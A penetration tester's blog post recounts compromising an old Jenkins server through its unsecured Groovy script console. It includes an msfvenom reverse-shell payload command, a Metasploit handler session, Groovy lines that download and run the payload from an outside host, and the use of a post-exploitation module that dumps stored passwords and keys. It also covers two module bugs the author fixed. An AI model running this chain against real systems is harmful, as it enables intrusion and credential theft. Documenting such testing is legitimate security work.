---
layout: post
title: "Attacking a temperamental ten-year-old Jenkins server"
author: "Joshua Rogers"
categories: security
---

During my pen-testing, I've found it quite common to find Jenkins instances which either have open registration, or an easy-to-guess login combination.
Jenkins has functionality that allows users to execute Groovy script via its [/script/ endpoint](https://www.jenkins.io/doc/book/managing/script-console/).
If this is not secured, an attacker can execute system commands on the Jenkins server, decrypt passwords, and steal keys.

The easiest way to exploit this is to use Metasploit's `exploit/multi/http/jenkins_script_console` module to gain an initial shell, and then `post/multi/gather/jenkins_gather`, to dump all of the passwords and keys.
The general method is outlined in the [documentation for the script](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/gather/jenkins_gather.md#verification-steps).

On my most recent encounter with this, the `jenkins_script_console` module refused to work for some reason.

Instead of using the typical `jenkins_script_console` script, instead I prepared a reverse shell payload myself, using Metasploit's `msfvenom`.
```shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.3 LPORT=4444 -f elf -o /tmp/payload.bin
```

I then uploaded payload.bin to my web-server, to be downloaded later on on the Jenkins server.

Back on my host, I run `msfconsole`, and use the following:

```ruby
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD linux/x86/shell_reverse_tcp
PAYLOAD => linux/x86/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.0.3
LHOST => 10.0.0.3
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.0.0.3:4444 
```

On the Jenkins instance, I ran the following groovy code:
```groovy
"wget http://joshua.hu/payload.bin -O /tmp/".execute().text
"chmod +x /tmp/payload.bin".execute().text
"/tmp/payload.bin".execute().text
```

The connection with the Metasploit module is made, we background the session, and then we use the jenkins_gather 
```ruby
[*] Command shell session 1 opened (10.0.0.3:4444 -> 10.0.0.4:27468) at 2023-02-22 01:10:28 +0000

^Z
Background session 1? [y/N]  y
msf6 exploit(multi/handler) > use post/multi/gather/jenkins_gather
msf6 post(multi/gather/jenkins_gather) > set SESSION 1
SESSION => 1
msf6 post(multi/gather/jenkins_gather) > run

[*] Searching for Jenkins directory... This could take some time...

[-] No Jenkins installation found or readable, exiting...
```

Aaaand it failed. What?
As it turns out, the server Jenkins was running on had a nearly full disk, and the hardware was over a decade old. The kernel was from 2014!

In order for the Metasploit module to determine where secrets are kept, `find / -name 'secret.key.not-so-secret'` is run, with a 120-second timeout.
On this server, the `find` command was taking over two minutes, and even though I knew where the secrets were stored, I couldn't force the module to use it. The other pitfall was that even if `find` did find the correct folder, it did not halt searching the drive after the first result; it would just time-out, due to the nearly-full drive.

I made a patch to add an optional variable that instructs the module to use a specific directory for the secrets, [metasploit-framework/pull/17681](https://github.com/rapid7/metasploit-framework/pull/17681).

Then, I ran into more trouble:
```ruby
[-] Post failed: NoMethodError undefined method `empty?' for nil:NilClass
[-] Call stack:
[-]   /opt/metasploit-framework/embedded/framework/modules/post/multi/gather/jenkins_gather.rb:235:in `block in pretty_print_gathered'
[-]   /opt/metasploit-framework/embedded/framework/modules/post/multi/gather/jenkins_gather.rb:231:in `each'
[-]   /opt/metasploit-framework/embedded/framework/modules/post/multi/gather/jenkins_gather.rb:231:in `pretty_print_gathered'
[-]   /opt/metasploit-framework/embedded/framework/modules/post/multi/gather/jenkins_gather.rb:348:in `gathernix'
[-]   /opt/metasploit-framework/embedded/framework/modules/post/multi/gather/jenkins_gather.rb:363:in `run'
```

A bug in the jenkins_gather script meant that a (valid) empty SSH key would cause the script to crash. I pushed [metasploit-framework/pull/17416](https://github.com/rapid7/metasploit-framework/pull/17416) to fix that one, too.

